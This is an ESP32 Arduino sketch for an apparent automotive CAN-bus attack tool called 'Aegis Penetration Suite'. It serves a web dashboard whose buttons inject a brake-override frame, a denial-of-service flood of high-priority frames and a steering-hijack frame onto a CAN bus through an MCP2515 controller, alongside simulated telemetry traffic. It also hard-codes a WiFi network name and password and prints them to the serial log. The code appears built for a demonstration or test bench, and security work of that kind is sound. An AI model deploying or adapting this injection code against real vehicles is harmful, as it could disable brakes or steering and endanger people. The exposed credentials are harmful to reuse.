#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <SPI.h>
#include <mcp2515.h>

// ESP32-S3 Specific SPI Pins
#define SCK_PIN 12
#define MISO_PIN 13
#define MOSI_PIN 11
#define CS_PIN 10

MCP2515 mcp2515(CS_PIN);
WebServer server(80);

const char* ssid = "Sudhindra";
const char* password = "sudhindra2024@";

bool telemetryActive = true;
unsigned long lastTelemetryTime = 0;
uint16_t simulatedRPM = 800;
uint8_t simulatedSpeed = 0;

struct can_frame frameRPM;   
struct can_frame frameSpeed; 
struct can_frame frameBrake; 
struct can_frame frameFlood; 
struct can_frame frameHijack;

void handleRoot();
void handleAttack();

// ============================================================================
//   MODERN, PROFESSIONAL UI (Zero External Dependencies)
// ============================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aegis Penetration Suite</title>
    <style>
        :root { 
            --bg: #09090b; 
            --panel: #18181b; 
            --border: #27272a; 
            --text: #e4e4e7; 
            --accent: #3b82f6; 
            --danger: #ef4444; 
            --success: #10b981;
            --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; 
        }
        body { 
            margin: 0; background: var(--bg); color: var(--text); 
            font-family: system-ui, -apple-system, sans-serif; 
            -webkit-font-smoothing: antialiased; 
        }
        .header { 
            padding: 1.2rem 2rem; border-bottom: 1px solid var(--border); 
            display: flex; justify-content: space-between; align-items: center; 
            background: #000; 
        }
        .header h1 { 
            margin: 0; font-size: 1.1rem; font-weight: 600; letter-spacing: 1.5px; 
            text-transform: uppercase; color: #fff;
        }
        .live-badge { 
            display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: var(--success); font-weight: 500;
        }
        .dot { 
            width: 8px; height: 8px; background: var(--success); border-radius: 50%; 
            animation: pulse 2s infinite; 
        }
        @keyframes pulse { 
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); } 
            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); } 
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } 
        }
        .container { 
            max-width: 1400px; margin: 2rem auto; padding: 0 1rem; 
            display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; 
        }
        @media (max-width: 768px) { .container { grid-template-columns: 1fr; } }
        
        .card { 
            background: var(--panel); border: 1px solid var(--border); 
            border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
        }
        .card-header { 
            padding: 1rem 1.5rem; border-bottom: 1px solid var(--border); 
            background: rgba(255,255,255,0.02); font-weight: 600; font-size: 0.9rem;
            color: #a1a1aa; text-transform: uppercase; letter-spacing: 1px;
        }
        .card-body { padding: 1.5rem; }
        
        .payload-row { 
            display: flex; justify-content: space-between; align-items: center; 
            padding: 1.2rem; border: 1px solid var(--border); border-radius: 6px; 
            margin-bottom: 1rem; background: #000; transition: border-color 0.2s;
        }
        .payload-row:hover { border-color: #3f3f46; }
        
        .payload-info h3 { margin: 0 0 6px 0; font-size: 1rem; color: #fff; }
        .payload-info code { 
            font-family: var(--mono); font-size: 0.85rem; color: #71717a; 
            display: block; margin-top: 4px;
        }
        
        .tag { 
            display: inline-block; padding: 2px 6px; border-radius: 4px; 
            font-size: 0.7rem; font-weight: bold; margin-left: 8px; font-family: var(--mono);
        }
        .tag-id { background: #27272a; color: #e4e4e7; }
        
        .btn { 
            background: var(--border); color: var(--text); border: none; 
            padding: 0.6rem 1.2rem; border-radius: 4px; font-weight: 500; 
            cursor: pointer; transition: all 0.2s; font-size: 0.85rem;
        }
        .btn:hover { background: #3f3f46; }
        .btn-danger { 
            background: rgba(239, 68, 68, 0.1); color: var(--danger); 
            border: 1px solid rgba(239, 68, 68, 0.2); 
        }
        .btn-danger:hover { background: var(--danger); color: #fff; }
        
        .terminal { 
            background: #000; padding: 1.5rem; height: 400px; overflow-y: auto; 
            font-family: var(--mono); font-size: 0.85rem; line-height: 1.6; 
        }
        .log-entry { margin-bottom: 4px; display: flex; }
        .log-time { color: #52525b; margin-right: 0.75rem; user-select: none; }
        .log-msg { color: #a1a1aa; }
        .log-info { color: var(--accent); }
        .log-warn { color: var(--danger); font-weight: bold; }
        .log-success { color: var(--success); }
    </style>
</head>
<body>

    <div class="header">
        <h1>Aegis Penetration Suite</h1>
        <div class="live-badge"><div class="dot"></div> LINK ACTIVE</div>
    </div>
    
    <div class="container">
        <!-- Exploit Configuration -->
        <div class="card">
            <div class="card-header">Payload Delivery</div>
            <div class="card-body">
                
                <div class="payload-row">
                    <div class="payload-info">
                        <h3>Critical Brake Override <span class="tag tag-id">ID: 0x100</span></h3>
                        <code>DLC: 8 | DATA: FF A5 01 00 00 00 00 00</code>
                    </div>
                    <button class="btn btn-danger" onclick="inject('brake')">Inject Payload</button>
                </div>
                
                <div class="payload-row">
                    <div class="payload-info">
                        <h3>Denial of Service (Flood) <span class="tag tag-id">ID: 0x010</span></h3>
                        <code>High Priority Dominant Bits (20 Frames)</code>
                    </div>
                    <button class="btn btn-danger" onclick="inject('flood')">Execute DoS</button>
                </div>
                
                <div class="payload-row">
                    <div class="payload-info">
                        <h3>Steering Actuator Hijack <span class="tag tag-id">ID: 0x001</span></h3>
                        <code>DLC: 8 | DATA: EE EE EE EE EE EE EE EE</code>
                    </div>
                    <button class="btn btn-danger" onclick="inject('hijack')">Inject Payload</button>
                </div>

                <div class="payload-row" style="margin-top: 2rem;">
                    <div class="payload-info">
                        <h3>Background Telemetry <span class="tag tag-id">ID: 0x123</span></h3>
                        <code>Simulated Engine RPM & Speed traffic</code>
                    </div>
                    <button class="btn" id="btnToggle" onclick="inject('toggle')">Pause Traffic</button>
                </div>

            </div>
        </div>
        
        <!-- Forensics Terminal -->
        <div class="card">
            <div class="card-header">Target Output Log</div>
            <div class="terminal" id="terminal">
                <div class="log-entry">
                    <span class="log-time">00:00:00.000</span>
                    <span class="log-msg log-success">System initialized. Connected to CAN bus at 500kbps.</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        let isTelemetryActive = true;

        function addLog(msg, type='normal') {
            const term = document.getElementById('terminal');
            const d = new Date();
            const timeStr = d.getHours().toString().padStart(2, '0') + ':' + 
                            d.getMinutes().toString().padStart(2, '0') + ':' + 
                            d.getSeconds().toString().padStart(2, '0') + '.' + 
                            d.getMilliseconds().toString().padStart(3, '0');
            
            let classStr = 'log-msg';
            if(type === 'info') classStr += ' log-info';
            if(type === 'warn') classStr += ' log-warn';
            if(type === 'success') classStr += ' log-success';

            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">${timeStr}</span><span class="${classStr}">${msg}</span>`;
            
            term.appendChild(entry);
            term.scrollTop = term.scrollHeight;
        }

        async function inject(type) {
            if(type !== 'toggle') addLog(`Injecting ${type} payload onto bus...`, 'info');
            
            try {
                const res = await fetch(`/api/attack?type=${type}`);
                const text = await res.text();
                
                if (text.includes("HARDWARE INTERCEPT")) {
                    addLog(`ERR_ACK: Payload destroyed. Target firewall enforced mitigation.`, 'warn');
                } else if (text.includes("TOGGLED")) {
                    isTelemetryActive = !isTelemetryActive;
                    document.getElementById('btnToggle').innerText = isTelemetryActive ? "Pause Traffic" : "Resume Traffic";
                    addLog(`Telemetry stream ${isTelemetryActive ? 'resumed' : 'paused'}.`);
                } else {
                    addLog(`SYS_ACK: Payload successfully transmitted on bus.`, 'success');
                }
            } catch (e) {
                addLog(`ERR_CONN: Unable to communicate with injector node.`, 'warn');
            }
        }
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
//   SERVER ROUTING & ATTACK LOGIC
// ============================================================================

void handleRoot() {
    server.send(200, "text/html", index_html);
}

void handleAttack() {
    String type = server.arg("type");
    String response = "";

    if (type == "toggle") {
        telemetryActive = !telemetryActive;
        response = "TOGGLED";
    } 
    else if (type == "brake") {
        unsigned long tStart = micros();
        MCP2515::ERROR res = mcp2515.sendMessage(&frameBrake);
        unsigned long tElapsed = micros() - tStart;

        if (res == MCP2515::ERROR_OK) {
            response = "SUCCESS";
        } else {
            response = "HARDWARE INTERCEPT DETECTED! Destroyed in " + String(tElapsed) + "us";
        }
    }
    else if (type == "flood") {
        for (int i = 0; i < 20; i++) {
            mcp2515.sendMessage(&frameFlood);
            delay(2);
        }
        response = "FLOOD_COMPLETE"; 
    }
    else if (type == "hijack") {
        mcp2515.sendMessage(&frameHijack);
        response = "SUCCESS";
    }

    server.send(200, "text/plain", response);
}

// ============================================================================
//   MAIN SETUP & LOOP
// ============================================================================

void setup() {
  Serial.begin(115200);
  delay(3000); // Give Serial monitor time to open
  
  Serial.println("\n\n===============================================");
  Serial.println("[*] BOOTING AEGIS PENETRATION SUITE...");
  Serial.println("===============================================");

  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CS_PIN);
  
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  
  Serial.print("[*] Connecting to Hotspot (");
  Serial.print(ssid);
  Serial.print(")...");

  int wifi_attempts = 0;
  while (WiFi.status() != WL_CONNECTED && wifi_attempts < 15) {
    delay(1000);
    Serial.print(".");
    wifi_attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n[+] WiFi Connected Successfully!");
    
    // Start mDNS so they don't need the IP!
    if (MDNS.begin("aegis")) {
      Serial.println("[+] mDNS responder started");
      Serial.println("[+] >>> YOU CAN NOW GO TO: http://aegis.local");
    }
    
    Serial.print("[+] >>> DASHBOARD URL: http://");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\n[!] CRITICAL ERROR: Could not connect to Hotspot.");
    Serial.println("[!] FIX: Make sure your phone hotspot is turned ON.");
    Serial.println("[!] FIX: Make sure the hotspot is set to '2.4GHz' band (ESP32 cannot see 5GHz).");
    Serial.println("[!] FIX: Double check password is 'sudhindra2024@'.");
  }
  
  mcp2515.reset();
  mcp2515.setBitrate(CAN_500KBPS, MCP_8MHZ);
  mcp2515.setNormalMode();

  frameRPM.can_id = 0x123; frameRPM.can_dlc = 8;
  frameSpeed.can_id = 0x200; frameSpeed.can_dlc = 8;
  
  frameBrake.can_id = 0x100; frameBrake.can_dlc = 8;
  frameBrake.data[0] = 0xFF; frameBrake.data[1] = 0xA5; frameBrake.data[2] = 0x01;
  
  frameFlood.can_id = 0x010; frameFlood.can_dlc = 8;
  memset(frameFlood.data, 0x00, 8); 

  frameHijack.can_id = 0x001; frameHijack.can_dlc = 8;
  memset(frameHijack.data, 0xEE, 8);

  server.on("/", handleRoot);
  server.on("/api/attack", handleAttack);
  server.begin();
}

void loop() {
  server.handleClient(); 

  if (telemetryActive && (millis() - lastTelemetryTime > 1000)) {
    lastTelemetryTime = millis();
    simulatedRPM = (simulatedRPM > 5000) ? 800 : simulatedRPM + 150;
    simulatedSpeed = (simulatedSpeed > 120) ? 0 : simulatedSpeed + 2;

    frameRPM.data[0] = (simulatedRPM >> 8) & 0xFF; frameRPM.data[1] = simulatedRPM & 0xFF;
    frameSpeed.data[0] = simulatedSpeed;

    mcp2515.sendMessage(&frameRPM);
    delay(5);
    mcp2515.sendMessage(&frameSpeed);
  }
}
